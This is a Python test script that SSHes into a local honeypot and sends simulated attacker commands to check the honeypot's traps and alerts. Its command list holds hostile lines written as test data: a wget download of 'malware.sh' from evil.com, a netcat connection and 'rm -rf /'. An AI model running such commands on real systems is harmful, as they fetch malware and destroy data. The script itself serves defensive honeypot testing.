import paramiko
import time

def run_attack():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    print("[*] Connecting to Honeypot...")
    try:
        client.connect('127.0.0.1', port=2222, username='root', password='password123', timeout=5)
        print("[+] Connected successfully! Telegram alert should have fired.")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    chan = client.invoke_shell()
    time.sleep(1)
    
    # Empty buffer initially
    while chan.recv_ready():
        chan.recv(4096)
        
    commands = [
        "ls",                               # Basic FS test
        "python --version",                 # Trigger Cognitive Mirror (Project Beta)
        "ls",                               # Verify Cognitive Mirror created new bait
        "wget http://evil.com/malware.sh",  # Trigger Mirror Hack (C2 Sinkhole)
        "zip -r backup.zip /var/www",       # Trigger Archive of Death (Zip Bomb)
        "nc 10.0.0.5 80",                   # Trigger Network Black Hole
        "rm -rf /",                         # Destructive test (Psychology + Firewall)
        "exit"
    ]
    
    for cmd in commands:
        print(f"\n[ATTACKER] Executing: {cmd}")
        chan.send(cmd + "\n")
        time.sleep(2)  # Wait for response
        
        output = ""
        while chan.recv_ready():
            output += chan.recv(4096).decode('utf-8', errors='ignore')
            
        lines = output.strip().split('\n')
        for line in lines:
            if line.strip():
                print(f"   > {line.strip()}")
                
    chan.close()
    client.close()
    print("\n[*] Attack Simulation Complete. Server should now process disconnect events (Firewall, feed, report).")

if __name__ == '__main__':
    run_attack()
